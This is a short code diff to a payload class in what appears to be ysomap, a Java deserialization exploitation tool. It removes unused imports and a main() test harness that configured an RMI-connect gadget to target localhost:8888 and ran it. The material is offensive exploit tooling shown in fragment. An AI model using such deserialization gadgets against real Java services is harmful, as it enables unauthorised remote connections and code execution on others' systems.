@@ -6,10 +6,8 @@ import ysomap.annotation.Dependencies;
 import ysomap.annotation.Payloads;
 import ysomap.annotation.Require;
 import ysomap.core.ObjectGadget;
-import ysomap.core.bean.Bullet;
 import ysomap.core.bean.Payload;
 import ysomap.core.gadget.bullet.jdk.rmi.RMIConnectBullet;
-import ysomap.runner.PayloadRunner;
 import ysomap.util.ReflectionHelper;
 
 import java.lang.reflect.Constructor;
@@ -57,14 +55,4 @@ public class RMIConnectWithUnicastRemoteObject extends Payload<UnicastRemoteObje
         return remoteObject;
     }
 
-    public static void main(String[] args) throws Exception {
-        Payload payload = new RMIConnectWithUnicastRemoteObject();
-        Bullet bullet = (Bullet) payload.getDefaultBullet("");
-        bullet.set("rhost","localhost");
-        bullet.set("rport","8888");
-        new PayloadRunner()
-                .setBullet(bullet)
-                .setPayload(payload)
-                .test();
-    }
 }
